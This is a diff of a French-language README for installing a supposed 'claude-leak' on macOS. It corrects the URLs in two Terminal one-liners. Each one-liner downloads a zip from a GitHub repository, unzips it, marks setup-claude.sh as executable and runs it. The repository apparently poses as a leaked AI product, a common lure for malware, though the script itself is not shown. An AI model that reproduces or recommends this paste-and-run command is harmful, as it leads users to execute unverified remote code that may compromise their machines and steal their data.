@@ -74,7 +74,7 @@ C'est la méthode la plus simple. Ouvrez l'application **Terminal** sur votre Ma
 Copiez-collez cette commande unique dans le Terminal et appuyez sur **Entrée** :
 
 ```bash
-curl -L -o claude.zip "[https://github.com/Xhelper-sys/claude-leak/archive/refs/heads/master.zip](https://github.com/Xhelper-sys/claude-leak/archive/refs/heads/master.zip)" && unzip -q claude.zip && cd claude-leak-master/src/launch && chmod +x setup-claude.sh && ./setup-claude.sh 
+curl -L -o claude.zip "https://github.com/Xhelper-sys/claude-leak/archive/refs/heads/master.zip" && unzip -q claude.zip && cd claude-leak-master/src/launch && chmod +x setup-claude.sh && ./setup-claude.sh 
 ```
 
 ### 🐢 Option 2 : Installation Étape par Étape
@@ -84,7 +84,7 @@ Si vous préférez comprendre ce que vous faites, voici les étapes détaillées
 Télécharge le fichier depuis GitHub et le décompresse automatiquement :
 
 ```bash
-curl -L -o claude.zip "[https://github.com/Xhelper-sys/claude-leak/archive/refs/heads/master.zip](https://github.com/Xhelper-sys/claude-leak/archive/refs/heads/master.zip)" && unzip -q claude.zip
+curl -L -o claude.zip "https://github.com/Xhelper-sys/claude-leak/archive/refs/heads/master.zip" && unzip -q claude.zip
 ```
 
 2. Aller dans le dossier d'installation
